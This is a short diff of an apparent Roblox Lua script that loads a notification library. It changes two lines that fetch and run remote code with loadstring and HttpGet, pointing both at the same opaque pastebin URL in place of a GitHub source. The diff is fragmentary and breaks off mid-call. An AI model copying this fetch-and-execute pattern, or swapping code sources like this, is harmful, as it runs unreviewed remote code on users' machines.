@@ -1,5 +1,5 @@
-local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))() 
- local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))() 
+local NotificationHolder = loadstring(game:HttpGet("https://pastebin.com/raw/FUEx0f3G"))() 
+ local Notification = loadstring(game:HttpGet("https://pastebin.com/raw/FUEx0f3G"))() 
 
  wait(1) 
  Notification:Notify( 
